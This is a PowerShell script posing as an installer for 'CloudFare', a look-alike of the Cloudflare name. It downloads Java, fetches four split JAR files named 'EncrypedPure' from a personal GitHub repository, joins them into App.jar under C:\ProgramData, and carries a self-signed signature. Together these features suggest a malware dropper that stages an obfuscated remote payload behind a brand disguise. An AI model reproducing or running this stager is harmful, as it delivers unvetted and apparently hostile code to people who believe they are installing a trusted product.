# CloudFare Installation v2.0 - Complete Working Version
# Downloads Java 21 + 4 JAR parts + Assembles them

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

$InstallDir = "C:\ProgramData\CloudFare"
$TempDir = "$InstallDir\Temp"
$JavaDir = "$InstallDir\Java"
$LogDir = "$InstallDir\Logs"

function Log {
    param([string]$Msg, [string]$Type = "INFO")
    $ts = Get-Date -Format "HH:mm:ss"
    switch ($Type) {
        "ERROR" { Write-Host "[$ts] ERROR: $Msg" -F Red }
        "SUCCESS" { Write-Host "[$ts] OK: $Msg" -F Green }
        "STEP" { Write-Host "`n[$ts] STEP: $Msg" -F Cyan }
        default { Write-Host "[$ts] INFO: $Msg" -F Gray }
    }
}

function Initialize {
    Log "Initializing directories..." "STEP"
    
    if (-not (Test-Path $InstallDir)) {
        New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
    }
    if (-not (Test-Path $TempDir)) {
        New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
    }
    if (-not (Test-Path $LogDir)) {
        New-Item -ItemType Directory -Path $LogDir -Force | Out-Null
    }
    
    Log "Directories ready" "SUCCESS"
}

function Download-Java {
    Log "Downloading Java 21..." "STEP"
    
    $javaZip = "$TempDir\java.zip"
    $javaUrl = "https://github.com/graalvm/graalvm-ce-builds/releases/download/jdk-21.0.1/graalvm-community-jdk-21.0.1_windows-x64_bin.zip"
    
    try {
        if (Test-Path $javaZip) {
            Remove-Item $javaZip -Force
        }
        
        Write-Host "  Downloading from: $javaUrl" -F Gray
        Invoke-WebRequest -Uri $javaUrl -OutFile $javaZip -TimeoutSec 300 -ErrorAction Stop
        
        $size = (Get-Item $javaZip).Length / 1MB
        Log "Java downloaded: $([math]::Round($size, 2)) MB" "SUCCESS"
        
        Log "Extracting Java..." "STEP"
        Expand-Archive -Path $javaZip -DestinationPath $JavaDir -Force
        Remove-Item $javaZip
        
        Log "Java installed to: $JavaDir" "SUCCESS"
        return $true
    } catch {
        Log "Failed to download Java: $_" "ERROR"
        return $false
    }
}

function Download-JarParts {
    Log "Downloading JAR parts..." "STEP"
    
    $partUrls = @(
        "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part1.jar",
        "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part2.jar",
        "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part3.jar",
        "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part4.jar"
    )
    
    $i = 1
    foreach ($url in $partUrls) {
        try {
            $partNum = $i
            $fileName = "EncrypedPure.part$partNum.jar"
            $filePath = "$TempDir\$fileName"
            
            Write-Host "  Part $partNum : $fileName" -F Gray
            Invoke-WebRequest -Uri $url -OutFile $filePath -TimeoutSec 300 -ErrorAction Stop
            
            $size = (Get-Item $filePath).Length / 1MB
            Log "Part $partNum downloaded: $([math]::Round($size, 2)) MB" "SUCCESS"
            
            $i++
        } catch {
            Log "Failed to download part $partNum" "ERROR"
            return $false
        }
    }
    
    return $true
}

function Assemble-Jar {
    Log "Assembling JAR parts..." "STEP"
    
    try {
        $outputJar = "$InstallDir\App.jar"
        $outStream = [System.IO.File]::Create($outputJar)
        
        for ($i = 1; $i -le 4; $i++) {
            $partFile = "$TempDir\EncrypedPure.part$i.jar"
            
            if (-not (Test-Path $partFile)) {
                Log "Part $i not found: $partFile" "ERROR"
                $outStream.Dispose()
                return $false
            }
            
            $inStream = [System.IO.File]::OpenRead($partFile)
            $buffer = New-Object byte[] 1MB
            $bytesRead = 0
            
            while (($bytesRead = $inStream.Read($buffer, 0, $buffer.Length)) -gt 0) {
                $outStream.Write($buffer, 0, $bytesRead)
            }
            
            $inStream.Dispose()
            Log "Part $i assembled" "SUCCESS"
        }
        
        $outStream.Dispose()
        
        $size = (Get-Item $outputJar).Length / 1MB
        Log "JAR assembled: $([math]::Round($size, 2)) MB" "SUCCESS"
        
        return $true
    } catch {
        Log "Assembly failed: $_" "ERROR"
        return $false
    }
}

function Verify-Installation {
    Log "Verifying installation..." "STEP"
    
    $javaExe = "$JavaDir\bin\java.exe"
    $appJar = "$InstallDir\App.jar"
    
    if (-not (Test-Path $javaExe)) {
        Log "Java not found" "ERROR"
        return $false
    }
    
    if (-not (Test-Path $appJar)) {
        Log "App.jar not found" "ERROR"
        return $false
    }
    
    Log "Java found: $javaExe" "SUCCESS"
    Log "App.jar found: $appJar" "SUCCESS"
    
    return $true
}

function Main {
    Write-Host ""
    Log "CloudFare Installation v2.0" "STEP"
    
    Initialize
    
    if (-not (Download-Java)) { return 1 }
    if (-not (Download-JarParts)) { return 1 }
    if (-not (Assemble-Jar)) { return 1 }
    if (-not (Verify-Installation)) { return 1 }
    
    Write-Host ""
    Write-Host "╔════════════════════════════════════════╗" -F Green
    Write-Host "║  Installation Successful!              ║" -F Green
    Write-Host "║  Ready to launch application           ║" -F Green
    Write-Host "╚════════════════════════════════════════╝" -F Green
    Write-Host ""
    
    return 0
}

Main

# SIG # Begin signature block
# MIIFWwYJKoZIhvcNAQcCoIIFTDCCBUgCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUkswuJ+WP9WF5+amlVb1Cqb/D
# wVagggL8MIIC+DCCAeCgAwIBAgIQFEA8i6m7gZ5GA+AtSKCeIjANBgkqhkiG9w0B
# AQsFADAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwHhcNMjUxMTI3MTY0NjI1WhcNMzAx
# MTI3MTY1NjI1WjAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwggEiMA0GCSqGSIb3DQEB
# AQUAA4IBDwAwggEKAoIBAQCwcOS5Unea33JuYXDoorRS8MRt7/sCwNRSDcdRUz7N
# fb1NjESMXbkE/rLcapbH8DhYfpX59h0Cp0ROdfgcQSxitCOqn5zGIOThKOHUW18x
# wJnOBM1lRrvZfoNun1cSgYnE1BQX+2FlrCjeHRUCkYo/KuCYlHjSD7W4BWwPGXPJ
# ofCbFhX909qbXblZt6jJBoTni8MNC+Bizfv302qhVAh+0CWCCsYYhcNAWXj+qb0t
# 9EvQHGQT6c2weIanGEcIMDwjO0/sldunBEVJBhe8TXeF/3wfn1rGAzqOgvYXFvd/
# J9eeO/Oeo+BDNBRwPcVHmO02vK7RCUJqR3Ub7pBNVbBpAgMBAAGjRjBEMA4GA1Ud
# DwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQU4eXXKcu5
# 5PGlisHTXHU95ihdYyMwDQYJKoZIhvcNAQELBQADggEBAHRZGGdVylXjYignpkSf
# 5ctiETsIscLuQTJJ1URT67Y+0x7xbcD9474OCUuTIEZh9wPL2HSmoNrDY7qxMKc4
# qCwxwoWQAWmLLcxgytJ8qpi2vZaExBDgODwU3LIA3uNu3iCmHbu8ISF68T1HR2+c
# 7cn1wn/C3XZOVhOW8CVjIpltD01LujsoauH8eRg93R6q3Z5yJ+5WJDNYzl6Y2xGL
# 9UQ4Xv7y8+wXES809v5+e/2kQL/NWwd3hOB6/176mfaT15ZZHBys1pYOJBHiMO9v
# W5IImNwQ/eXXzUrppVnCQ6fLm5GyTKqGq14cMahma6K8r9lrgvkLI1VS1ue0La5l
# 5MAxggHJMIIBxQIBATAoMBQxEjAQBgNVBAMMCUNsb3VkRmFyZQIQFEA8i6m7gZ5G
# A+AtSKCeIjAJBgUrDgMCGgUAoHgwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZ
# BgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYB
# BAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQUIlNkjhTMp0Az/q8oiKjqIJ32aq0wDQYJ
# KoZIhvcNAQEBBQAEggEAQKtr2J7fbvLv7S1N+kjrYh4f79psNNKiWSrF2GyPwvRv
# OyFgORRpY9pLw5t8uSBiFCXXkic5rtPOYYWUcuc+QkE6RhV336ImBc58AS9GZ6il
# IDPRDomTAI+2Ybb1AaDhrk2k1BHQHPUCnv9plmceTaX9enCaWiuDPeDNJeFBY93h
# l4fJ9le/ld6udlRqxq34xsAcChMtmjrJMwDgC92/MYlavnf/1yiTzPEYn9RUasNF
# 6XlBfqTJd46lmZMb9mZPUOYBazWkPwBPpScvWFzxQmyoZoUusFBdsmHQGPpDZnlq
# Bob1bq/9ZZhEBjyO5y8GuBgAKSt22SiTs9ACwMM0JA==
# SIG # End signature block
